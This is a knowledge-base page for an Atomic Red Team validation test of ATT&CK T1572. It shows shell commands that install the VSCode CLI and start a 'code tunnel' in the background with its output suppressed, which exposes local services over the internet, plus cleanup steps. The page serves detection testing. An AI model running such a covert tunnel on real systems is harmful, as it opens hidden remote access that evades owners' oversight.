---
atomic_guid: "b877943f-0377-44f4-8477-f79db7f07c4d"
title: "VSCode tunnels (Linux/macOS)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1572"
attack_technique_name: "Protocol Tunneling"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1572/T1572.yaml"
build_date: "2026-04-27 19:12:28"
executor: "sh"
aliases:
  - "b877943f-0377-44f4-8477-f79db7f07c4d"
  - "VSCode tunnels (Linux/macOS)"
platforms:
  - "linux"
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Visual Studio Code Remote Tunnels can be used for exposing local development environment/services/files over the internet.
This atomic will generate a dev tunnel binding it to the local service running on the provided port.
Reference:
- [Microsoft Docs](https://code.visualstudio.com/docs/remote/tunnels)
- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/vscode-server/)

## ATT&CK Mapping

- [[kb/attack/techniques/T1572-protocol_tunneling|T1572: Protocol Tunneling]]

## Input Arguments

### additional_args

- description: additional arguments to pass to code tunnel
- type: string

### artifact_base_url

- description: Base URL to download code-cli
- type: string
- default: https://code.visualstudio.com/sha/download

### artifact_build

- description: build to download - Allowed values (stable/insiders)
- type: string
- default: stable

### payload_path

- description: path to download code-cli
- type: string
- default: PathToAtomicsFolder/../ExternalPayloads

## Dependencies

Install code-cli

### Prerequisite Check

```untitled
which code
```

### Get Prerequisite

```untitled
ARCH_SUFFIX=$(uname -m | grep -q "arm64\|aarch64" && echo "arm64" || echo "x64")
if [ "$(uname)" = "Darwin" ]
then brew install code-cli
elif [ "$(expr substr $(uname) 1 5)" = "Linux" ]
then mkdir -p $(dirname #{payload_path})        
  PKG_TYPE=$(command -v apt >/dev/null && echo "deb" || echo "rpm")
  curl -L "#{artifact_base_url}?build=#{artifact_build}&os=linux-${PKG_TYPE}-${ARCH_SUFFIX}" -o "#{payload_path}/code.${PKG_TYPE}"
  (which apt && apt install -y "#{payload_path}/code.${PKG_TYPE}") || (which yum && yum install -y "#{payload_path}/code.${PKG_TYPE}")
  rm "#{payload_path}/code.${PKG_TYPE}"
fi
```

Login to VSCode Dev tunnels

### Prerequisite Check

```untitled
code tunnel user show | grep -q "not logged in" && exit 1 || exit 0
```

### Get Prerequisite

```untitled
echo "Login to code tunnel using the following command: code tunnel user login"
```

## Executor

- name: sh

### Command

```bash
nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &
```

### Cleanup

```bash
pkill -9 tunnel
code tunnel unregister
code tunnel user logout
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1572/T1572.yaml)
